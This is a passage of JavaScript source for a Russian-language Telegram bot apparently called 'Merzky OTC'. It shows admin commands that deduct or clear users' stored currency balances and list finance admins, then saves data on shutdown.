    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    
    const amount = parseInt(m[2]);
    const currency = m[3].toUpperCase();
    const key = currency.toLowerCase();
    
    if (!userBalances.has(targetId)) {
        return bot.sendMessage(msg.chat.id, '❌ У пользователя нет баланса');
    }
    
    const userBalance = userBalances.get(targetId);
    
    if (!userBalance[key] || userBalance[key] < amount) {
        return bot.sendMessage(msg.chat.id, `❌ У пользователя недостаточно ${currency}`);
    }
    
    userBalance[key] -= amount;
    if (userBalance[key] === 0) delete userBalance[key];
    userBalances.set(targetId, userBalance);
    saveData();
    
    const emoji = {
        'stars': '⭐', 'usdt': '💵', 'rub': '🇷🇺', 'uah': '🇺🇦',
        'cny': '🇨🇳', 'aed': '🇦🇪', 'eur': '🇪🇺', 'usd': '💵'
    }[key] || '💰';
    
    bot.sendMessage(msg.chat.id, `${emoji} Снято ${amount} ${currency} у пользователя ${m[1]}`);
    bot.sendMessage(targetId, `${emoji} У вас снято ${amount} ${currency}`);
});

bot.onText(/\/clearbalance (.+)/, (msg, m) => {
    if (!isMaster(msg.from.id)) return;
    
    const targetId = getUserFromMention(m[1]);
    if (!targetId) return bot.sendMessage(msg.chat.id, '❌ Пользователь не найден');
    
    if (userBalances.has(targetId)) {
        userBalances.delete(targetId);
        saveData();
        bot.sendMessage(msg.chat.id, `✅ Баланс пользователя ${m[1]} полностью очищен`);
        bot.sendMessage(targetId, `🔄 Ваш баланс был полностью обнулён`);
    } else {
        bot.sendMessage(msg.chat.id, `❌ У пользователя нет баланса`);
    }
});

bot.onText(/\/accesslist/, (msg) => {
    if (!isMaster(msg.from.id)) return;
    
    let text = `👥 *Пользователи с доступом к начислениям:*\n\n`;
    
    if (financeAdmins.length === 0) {
        text += `Список пуст`;
    } else {
        financeAdmins.forEach(id => {
            const u = users.get(id);
            text += `• @${u?.username || 'unknown'} (${id})\n`;
        });
    }
    
    bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

// ========== СОХРАНЕНИЕ ==========
process.on('SIGINT', () => { saveData(); process.exit(); });

console.log('🔥 Merzky OTC Бот запущен!');
console.log('👑 Команда админа: /merzkyteam');
console.log('💰 Все валюты мира поддерживаются');
console.log('✅ Есть команды снятия /removecurr и очистки /clearbalance');